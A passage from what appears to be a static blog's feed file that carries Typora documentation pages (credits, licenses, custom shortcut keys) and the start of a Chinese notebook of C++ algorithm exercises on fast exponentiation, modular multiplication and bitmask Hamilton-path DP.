ifthe language you want is not supported in Typora, you could:</p><ol type="1"><li>Check whether the language is support on <a href="http://codemirror.net/mode/" class="uri">http://codemirror.net/mode/</a> or not, if so, send us anemail, and we will add related support.</li><li>If the language is not supported on <a href="http://codemirror.net/mode/" class="uri">http://codemirror.net/mode/</a>, please check <a href="https://github.com/codemirror/CodeMirror/wiki/Mode-wish-list" class="uri">https://github.com/codemirror/CodeMirror/wiki/Mode-wish-list</a>for adding syntax highlight on CodeMirror. After it is supported byCodeMirror, Typora will follow.</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Credits/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Credits/</url>
    
    <content type="html"><![CDATA[<h1 id="credits">Credits</h1><p><strong>Typora</strong> is developed by <a href="https://twitter.com/LeeAbner"><span class="citation" data-cites="LeeAbner">@LeeAbner</span></a>. All rights reserved.</p><h2 id="localization-contributors">Localization Contributors</h2><ul><li>Simplified Chinese by <a href="https://github.com/abnerlee">abnerlee</a>, <a href="https://github.com/NoDotCat">NoDotCat</a>, <a href="https://github.com/HowardTangHw">HowardTangHw</a>, <a href="https://github.com/Emphasia">Emphasia</a></li><li>Traditional Chinese by <a href="https://github.com/cyberrob">cyberrob</a></li><li>Polish by <a href="https://github.com/iriusturar">iriusturar</a></li><li>Korean by <a href="https://github.com/ryush00">ryush00</a>, <a href="https://github.com/marigold9124">marigold9124</a>, <a href="https://github.com/vreality64">vreality64</a>, <a href="https://github.com/yuririri">yuririri</a>, <a href="https://github.com/Third9">Third9</a></li><li>Italian by <a href="https://github.com/starise">starise</a>, <a href="https://github.com/jethro17">jethro17</a></li><li>Spanish by <a href="https://github.com/thepiratejester">thepiratejester</a>, <a href="https://github.com/rgomez90">rgomez90</a></li><li>French by <a href="https://github.comMOrdinateur">MOrdinateur</a></li><li>Russian by <a href="https://github.com/dragomano">dragomano</a></li><li>Japanese by <a href="https://github.com/tomochan001">tomochan001</a>, <a href="https://github.com/gageas">gageas</a></li><li>Portuguese (Brazil) by <a href="https://github.com/akz92">akz92</a></li><li>German by <a href="https://github.com/rcvd">rcvd</a>, Gert</li><li>Czech by <a href="https://github.com/byDave251">byDave251</a>, <a href="https://github.com/byDave251">psimacek</a></li><li>Greek by <a href="https://github.com/kiriakosv">kiriakosv</a></li><li>Croatian by <a href="https://github.com/diomed">diomed</a></li><li>Hungarian by <a href="https://github.com/mocsa">mocsa</a></li><li>Portuguese (Portugal) by <a href="https://github.com/jcamilo93">camilo93</a></li><li>Galician by <a href="https://github.com/nunhes">nunhes</a></li><li>Indonesia by <a href="https://github.com/snatalius">snatalius</a></li><li>Vietnamese by <a href="https://github.com/1234hdpa">1234hdpa</a></li></ul><h2 id="rd-party-libraries-icons">3rd Party Libraries / Icons</h2><p>Following codes / libraries make it happen, thanks for theirwork.</p><h3 id="mathjax"><a href="http://www.mathjax.org/">MathJax</a></h3><p>Copyright [yyyy][of copyright owner]</p><p>Licensed under the Apache License, Version 2.0 (the "License");</p><p>you may not use this file except in compliance with the License.</p><p>You may obtain a copy of the License athttp://www.apache.org/licenses/LICENSE-2.0 Unless required by applicablelaw or agreed to in writing, software distributed under the License isdistributed on an "AS IS" BASIS,</p><p>WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express orimplied.</p><p>See the License for the specific language governing permissions andlimitations under the License.</p><h3 id="bootstrap"><a href="http://getbootstrap.com/">Bootstrap</a></h3><p>Copyright (c) 2011-2014 Twitter, Inc</p><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="jquery"><a href="jquery.org">JQuery</a></h3><p>copyright 2005, 2014 jQuery Foundation and other contributors,https://jquery.org/ This software consists of voluntary contributionsmade by many individuals. For exact contribution history, see therevision history available at https://github.com/jquery/jquery Thefollowing license applies to all parts of this software except asdocumented below:</p><p>Permission is hereby granted, free of charge, to any person obtaininga copy of this software and associated documentation files (the"Software"), to deal in the Software without restriction, includingwithout limitation the rights to use, copy, modify, merge, publish,distribute, sublicense, and/or sell copies of the Software, and topermit persons to whom the Software is furnished to do so, subject tothe following conditions:</p><p>The above copyright notice and this permission notice shall beincluded in all copies or substantial portions of the Software.</p><p>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OFMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANYCLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THESOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p><h3 id="codemirror"><a href="http://codemirror.net/">CodeMirror</a></h3><p>Copyright (C) 2014 by Marijn Haverbeke <a href="mailto:marijnh@gmail.com" class="email">marijnh@gmail.com</a> andothers</p><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="rangy"><a href="https://github.com/timdown/rangy">rangy</a></h3><p>Copyright (c) 2014 Tim Down</p><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="exoskeleton"><a href="http://exosjs.com">Exoskeleton</a></h3><p>Copyright (c) 2013 Paul Miller (<a href="http://paulmillr.com/">http://paulmillr.com</a>)</p><p>Copyright (c) 2010-2011 Jeremy Ashkenas, DocumentCloud Inc.</p><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="autocomplt"><a href="https://github.com/Fischer-L/autoComplt">autoComplt</a></h3><p>Copyright (C) 2013 Fischer Liu</p><p>Permission is hereby granted, free of charge, to any person obtaininga copy of this software and associated documentation files (the"Software"), to deal in the Software without restriction, includingwithout limitation the rights to use, copy, modify, merge, publish,distribute, sublicense, and/or sell copies of the Software, and topermit persons to whom the Software is furnished to do so, subject tothe following conditions:</p><p>The above copyright notice and this permission notice shall beincluded in all copies or substantial portions of the Software.</p><p>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OFMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANYCLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THESOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p><h3 id="pdf.js"><a href="http://mozilla.github.io/pdf.js/">PDF.js</a></h3><p>Licensed under the <a href="https://github.com/mozilla/pdf.js/blob/master/LICENSE">ApacheLicense</a>, Version 2.0 (the "License");</p><p>you may not use this file except in compliance with the License.</p><p>You may obtain a copy of the License athttp://www.apache.org/licenses/LICENSE-2.0 Unless required by applicablelaw or agreed to in writing, software distributed under the License isdistributed on an "AS IS" BASIS,</p><p>WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express orimplied.</p><p>See the License for the specific language governing permissions andlimitations under the License.</p><h3 id="yapdfkit"><a href="https://github.com/mipmip/YAPDFKit">YAPDFKit</a></h3><p><a href="https://github.com/mipmip/YAPDFKit/blob/master/LICENSE">MITLicense</a></p><h3 id="pdf-designer"><a href="http://www.petitmonte.com/pdfdesigner/">PDF Designer</a></h3><p>The MIT License (MIT)</p><p>Copyright (c) 2015 Takeshi Okamoto</p><h3 id="font-awesome"><a href="http://fortawesome.github.io/Font-Awesome/">Font Awesome</a></h3><h4 id="font-license">Font License</h4><ul><li>Applies to all desktop and webfont files in the followingdirectory: <code>font-awesome/fonts/</code>.</li><li>License: SIL OFL 1.1</li><li>URL: <a href="http://scripts.sil.org/OFL">http://scripts.sil.org/OFL</a></li></ul><h4 id="code-license">Code License</h4><ul><li>Applies to all CSS and LESS files in the followingdirectories: <code>font-awesome/css/</code>, <code>font-awesome/less/</code>,and <code>font-awesome/scss/</code>.</li><li>License: MIT License</li><li>URL: <a href="http://opensource.org/licenses/mit-license.html">http://opensource.org/licenses/mit-license.html</a></li></ul><h4 id="documentation-license">Documentation License</h4><ul><li>Applies to all Font Awesome project files that are not a part of theFont or Code licenses.</li><li>License: CC BY 3.0</li><li>URL: <a href="http://creativecommons.org/licenses/by/3.0/">http://creativecommons.org/licenses/by/3.0/</a></li></ul><h3 id="jquery-localize"><a href="https://github.com/coderifous/jquery-localize">jquery-localize</a></h3><p>Copyright (c) Jim Garvin (<a href="http://github.com/coderifous">http://github.com/coderifous</a>),2008.</p><p>Dual licensed under the GPL (<a href="http://dev.jquery.com/browser/trunk/jquery/GPL-LICENSE.txt">http://dev.jquery.com/browser/trunk/jquery/GPL-LICENSE.txt</a>)and MIT (<a href="http://dev.jquery.com/browser/trunk/jquery/MIT-LICENSE.txt">http://dev.jquery.com/browser/trunk/jquery/MIT-LICENSE.txt</a>)licenses.</p><p>Written by Jim Garvin (<span class="citation" data-cites="coderifous">@coderifous</span>) for use on LMGTFY.com.Please use it, and contribute changes.</p><p><a href="http://github.com/coderifous/jquery-localize">http://github.com/coderifous/jquery-localize</a></p><p>Based off of Keith Wood's Localisation jQuery plugin. <a href="http://keith-wood.name/localisation.html">http://keith-wood.name/localisation.html</a></p><h3 id="the-alphanum-algorithm"><a href="http://www.davekoelle.com/alphanum.html">The AlphanumAlgorithm</a></h3><p><a href="https://opensource.org/licenses/MIT">MIT License</a></p><p>Copyright © 1997 - 2010 David Koelle (<a href="mailto:dmkoelle@gmail.com">dmkoelle@gmail.com</a>). All rightsreserved.</p><h3 id="macgap"><a href="https://github.com/MacGapProject/MacGap1">MacGap</a></h3><p>MacGap was ported from phonegap-mac, and is under the same license(MIT)</p><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="sparkle"><a href="http://sparkle-project.org/">Sparkle</a></h3><p>Copyright (c) 2006-2013 Andy Matuschak.</p><p>Copyright (c) 2009-2013 Elgato Systems GmbH.</p><p>Copyright (c) 2011-2014 Kornel Lesiński.</p><p>Copyright (c) 2014 C.W. Betts.</p><p>Copyright (c) 2014 Petroules Corporation.</p><p>Copyright (c) 2014 Big Nerd Ranch.</p><p>All rights reserved.</p><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="markdown"><a href="http://daringfireball.net/projects/markdown">Markdown</a></h3><p>Copyright © 2004, John Gruber </p><p><a href="http://daringfireball.net/">http://daringfireball.net/</a> </p><p>All rights reserved.</p><p>Redistribution and use in source and binary forms, with or withoutmodification, are permitted provided that the following conditions aremet:</p><ul><li>Redistributions of source code must retain the above copyrightnotice, this list of conditions and the following disclaimer.</li><li>Redistributions in binary form must reproduce the above copyrightnotice, this list of conditions and the following disclaimer in thedocumentation and/or other materials provided with thedistribution.</li><li>Neither the name “Markdown” nor the names of its contributors may beused to endorse or promote products derived from this software withoutspecific prior written permission.</li></ul><p>This software is provided by the copyright holders and contributors“as is” and any express or implied warranties, including, but notlimited to, the implied warranties of merchantability and fitness for aparticular purpose are disclaimed. In no event shall the copyright owneror contributors be liable for any direct, indirect, incidental, special,exemplary, or consequential damages (including, but not limited to,procurement of substitute goods or services; loss of use, data, orprofits; or business interruption) however caused and on any theory ofliability, whether in contract, strict liability, or tort (includingnegligence or otherwise) arising in any way out of the use of thissoftware, even if advised of the possibility of such damage.</p><h3 id="gitbook"><a href="https://github.com/GitbookIO/gitbook">Gitbook</a></h3><p><a href="https://github.com/GitbookIO/gitbook/blob/master/LICENSE">ApacheLicense</a></p><h3 id="pixyll"><a href="pixyll.com">Pixyll</a></h3><p>Pixyll</p><p>A simple, beautiful theme for Jekyll that emphasizes content ratherthan</p><p>aesthetic fluff.</p><p>Best served with BASSCSS (http://jxnblk.github.io/basscss)</p><p>Crafted with &lt;3 by John Otander (<span class="citation" data-cites="4lpine">@4lpine</span>) - ©2015 John Otander</p><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="markdown-it-emoji"><a href="https://github.com/markdown-it/markdown-it-emoji">markdown-it-emoji</a></h3><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="emojilib"><a href="https://github.com/muan/emojilib">emojilib</a></h3><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="electron"><a href="https://github.com/atom/electron">Electron</a></h3><p>MIT License https://github.com/atom/electron/blob/master/LICENSE</p><h3 id="fs-extra"><a href="https://github.com/jprichardson/node-fs-extra">fs-extra</a></h3><p>MIT Licensehttps://github.com/jprichardson/node-fs-extra/blob/master/LICENSE</p><h3 id="lowdb"><a href="https://github.com/typicode/lowdb">lowdb</a></h3><p>MIT License https://github.com/typicode/lowdb/blob/master/LICENSE</p><h3 id="spellchecker-node-module"><a href="https://github.com/atom/node-spellchecker">SpellChecker NodeModule</a></h3><p>MIT Licensehttps://github.com/atom/node-spellchecker/blob/master/LICENSE.md</p><h3 id="ionicons"><a href="http://ionicons.com/">ionicons</a></h3><p>MIT License http://opensource.org/licenses/MIT</p><h3 id="win-mouse"><a href="https://www.npmjs.com/package/win-mouse">win-mouse</a></h3><p><a href="http://opensource.org/licenses/MIT">MIT</a> License</p><h3 id="iconv-lite"><a href="https://github.com/ashtuchkin/iconv-lite">iconv-lite</a></h3><p>MIT Licensehttps://github.com/ashtuchkin/iconv-lite/blob/master/LICENSE</p><h3 id="jschardet"><a href="https://github.com/aadsm/jschardet">jschardet</a></h3><p>LGPL License</p><h3 id="is-utf8"><a href="https://github.com/wayfind/is-utf8">is-utf8</a></h3><p><a href="https://github.com/wayfind/is-utf8/blob/master/LICENSE">MIT</a></p><h3 id="hjson"><a href="https://github.com/laktak/hjson-js">HJson</a></h3><p>MIT Licensehttps://github.com/laktak/hjson-js/blob/master/LICENSE</p><h3 id="js-sequence"><a href="https://bramp.github.io/js-sequence-diagrams/">js-sequence</a></h3><p>MIT Licensehttps://github.com/bramp/js-sequence-diagrams/blob/master/LICENCE</p><h3 id="flowchart.js"><a href="http://flowchart.js.org/">Flowchart.js</a></h3><p>MIT Licensehttps://github.com/adrai/flowchart.js/blob/master/license</p><h3 id="mermaid"><a href="https://knsv.github.io/mermaid/#mermaid">Mermaid</a></h3><p>MIT License https://github.com/knsv/mermaid/blob/master/LICENSE</p><h3 id="lighttable-elixir"><a href="https://github.com/awetzel/lighttable-elixir">lighttable-elixir</a></h3><p>MIT Licensehttps://github.com/awetzel/lighttable-elixir/blob/master/codemirror/LICENSE</p><h3 id="ipicuploader"><a href="https://github.com/toolinbox/iPicUploader">iPicUploader</a></h3><p>MIT Licensehttps://github.com/toolinbox/iPicUploader/blob/master/LICENSE</p><h3 id="multimedia-element-set"><a href="http://www.flaticon.com/packs/multimedia-element-set">MultimediaElement Set</a></h3><p>Icon made by <a href="http://hadrien.co/">hadrein</a>, <a href="https://creativecommons.org/licenses/by/3.0/">CC3.0</a>license.</p><h3 id="vaadin-icons"><a href="https://vaadin.com/icons">Vaadinicons</a></h3><p>Icon made by <a href="https://vaadin.com/icons">vaadin</a>, <a href="https://creativecommons.org/licenses/by/3.0/">CC3.0</a>license.</p><h3 id="fs-plus"><a href="https://github.com/atom/fs-plus">fs-plus</a></h3><p><a href="https://github.com/atom/fs-plus/blob/master/LICENSE.md">MITLicense</a></p><h3 id="node-pathwatcher"><a href="http://atom.github.io/node-pathwatcher/">node-pathwatcher</a></h3><p><a href="https://github.com/atom/node-pathwatcher/blob/master/LICENSE.md">MITLicense</a></p><h2 id="dompurify"><a href="https://github.com/cure53/DOMPurify">DOMPurify</a></h2><p><a href="https://github.com/cure53/DOMPurify/blob/master/LICENSE">Apache-2.0</a></p><h3 id="wcwidth.js"><a href="https://github.com/mycoboco/wcwidth.js">wcwidth.js</a></h3><p><a href="https://github.com/mycoboco/wcwidth.js/blob/master/LICENSE.md">MITLicense</a></p><h3 id="morphdom"><a href="https://github.com/patrick-steele-idem/morphdom">morphdom</a></h3><p><a href="https://github.com/patrick-steele-idem/morphdom/blob/master/LICENSE">MITLicense</a></p><h3 id="webviewproxy"><a href="https://github.com/marcuswestin/WebViewProxy">WebViewProxy</a></h3><p><a href="https://github.com/marcuswestin/WebViewProxy/blob/master/LICENSE">MITLicense</a></p><h3 id="sentry"><a href="https://github.com/getsentry">Sentry</a></h3><p><a href="https://github.com/getsentry/sentry-javascript/blob/master/LICENSE">BSD3-Clause License</a></p><h3 id="countly"><a href="https://github.com/Countly">Countly</a></h3><p><a href="https://github.com/Countly/countly-sdk-ios/blob/master/LICENSE.md">MITLicense</a></p><h3 id="unorm"><a href="https://github.com/walling/unorm">Unorm</a></h3><p><a href="https://github.com/walling/unorm/blob/master/LICENSE.md">MITLicense</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Shortcut%20Keys/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Shortcut%20Keys/</url>
    
    <content type="html"><![CDATA[<h1 id="custom-shortcut-keys">Custom Shortcut Keys</h1><p>User can set or reassign shortcut keys for commands in Typora'smenubar. This article will show how to customise typora' keybinding.</p><h1 id="macos">macOS</h1><p>We use macOS's system feature to customise typora's key binding onmacOS.</p><ol type="1"><li><p>Open <code>System Preference</code> → <code>Keyboard</code>,select tab <code>Shortcuts</code>. Select <code>App Shortcuts</code> inits left panel.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Shortcut%20Keys/Snip20160814_1.png" alt="Snip20160814_1"><figcaption aria-hidden="true">Snip20160814_1</figcaption></figure></li><li><p>Click the "+" button, a dialog sheet would popup. Select"Typora.app" from field <code>Application</code>, then input the exactname of the menu command you want to add, and then input the shortcutkey you want to assign.</p><p>For example, assume you want to add/change the shortcut key to pintypora's window, you could fill the dialog like following:</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Shortcut%20Keys/Snip20160814_5.png" alt="Snip20160814_5"><figcaption aria-hidden="true">Snip20160814_5</figcaption></figure><p>Then <code>Command+Shift+P</code> will be the shortcut key for menucommand "Always on Top"</p></li></ol><h1 id="windows">Windows</h1><p><em>(Requires Typora ≥ v0.9.16)</em></p><ol type="1"><li><p>Open <code>Menu</code> → <code>Preference</code> in Typora, thenclick "Open Advanced Settings".</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Shortcut%20Keys/sshot-1.png" alt="sshot-1"><figcaption aria-hidden="true">sshot-1</figcaption></figure></li><li><p>Open and edit <code>conf.user.json</code> from opened "FileExplore". If there's no such file, create one.</p></li><li><p>Set or add JSON object which represents a key binding, forexample:</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Shortcut%20Keys/Snip20160814_7.png" alt="sshot-2"><figcaption aria-hidden="true">sshot-2</figcaption></figure></li><li><p>Restart Typora, and the new key binding will be applied.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Shortcut%20Keys/sshot-2.png" alt="sshot-2"><figcaption aria-hidden="true">sshot-2</figcaption></figure></li></ol><p>You could set or change shortcut keys for menu items in menu bar innative window style.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/DO%20NOT%20ADD%20FILES%20HERE/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/DO%20NOT%20ADD%20FILES%20HERE/</url>
    
    <content type="html"><![CDATA[<p>This folder will be replaced / removed during update / uninstall. Donot write your files here.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>algorithm_enhance</title>
    <link href="/2024/12/03/algorithm-enhance/"/>
    <url>/2024/12/03/algorithm-enhance/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>例题及习题代码记录</p><h2 id="基础算法">基础算法</h2><h3 id="位运算">位运算</h3><h4 id="快速幂">快速幂</h4><h5 id="int乘方">int乘方</h5><p>int:10<sup>9,2</sup>32-1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> a, b, p;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;p);<br><span class="hljs-type">int</span> tmpa = a, tmpb = b;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">1</span> % p;<br><span class="hljs-keyword">for</span> (; b; b &gt;&gt;= <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (b &amp; <span class="hljs-number">1</span>) ans = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a * ans % p;<br>a = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a * a % p;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d^%d mod %d=%d&quot;</span>, tmpa, tmpb, p, ans);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="long-long乘法">long long乘法</h5><p>long long : 10<sup>18,2</sup>64-1</p><p>解法一：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> a, b, p;<br>cin &gt;&gt; a &gt;&gt; b &gt;&gt; p;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (; b; b &gt;&gt;= <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (b &amp; <span class="hljs-number">1</span>) ans = (ans + a) %p;<br>a = a * <span class="hljs-number">2</span> % p;   <span class="hljs-comment">//依据公式，*2，非乘方</span><br>&#125;<br>cout &lt;&lt; ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解法二： <span class="math display">\[a*b mod p = a*b - (a*b/p)*p\]</span></p><ol type="1"><li>a * b 与 a * b / p * p的值可能很大，但差一定位于0~(p-1)，只关心低位的差即可，可使用long long存储</li><li>a * b / p 的计算：当a,b小于p时，结果也小于p，使用long double进行计算，且不关心小数部分</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> a, b, p;<br>cin &gt;&gt; a &gt;&gt; b &gt;&gt; p;<br>a %= p;<br>b %= p;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> c = (<span class="hljs-type">long</span> <span class="hljs-type">double</span>)a * b / p;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ans = a * b - c * p;  <span class="hljs-comment">//在0-p之间</span><br><span class="hljs-keyword">if</span> (ans &lt; <span class="hljs-number">0</span>) ans += p;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ans &gt; p) ans -= p;<br>cout &lt;&lt; ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="二进制状态压缩">二进制状态压缩</h4><p>用长度为m的bool数组存储m位二进制数</p><h5 id="最短hamilton路径">最短Hamilton路径</h5><p>Hamilton路径：不重不漏地经过每一个点一次</p><p>F[i,j]：i表示路径经过的状态，j表示当前所处位置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> weight[<span class="hljs-number">20</span>][<span class="hljs-number">20</span>];<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> f[<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>][<span class="hljs-number">20</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>&#123;<br>cin &gt;&gt; weight[i][j];<br>&#125;<br>&#125;<br><span class="hljs-built_in">memset</span>(f, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> f);<br>f[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1</span> &lt;&lt; n; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (i &gt;&gt; j &amp; <span class="hljs-number">1</span>)   <span class="hljs-comment">//有效状态</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; n; k++)<br>&#123;<br><span class="hljs-keyword">if</span> ((i ^ (<span class="hljs-number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="hljs-number">1</span>)  <span class="hljs-comment">//第j位取反</span><br>&#123;<br>f[i][j] = <span class="hljs-built_in">min</span>(f[i][j], f[i ^ (<span class="hljs-number">1</span>&lt;&lt;j)][k] + weight[k][j]);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>cout &lt;&lt; f[(<span class="hljs-number">1</span> &lt;&lt; n) - <span class="hljs-number">1</span>][n - <span class="hljs-number">1</span>] &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="起床困难综合症">起床困难综合症</h5><p>不超过 10^9的数需要 30 位的二进制表示。</p><figure class="highlight c++"><table><tr><td 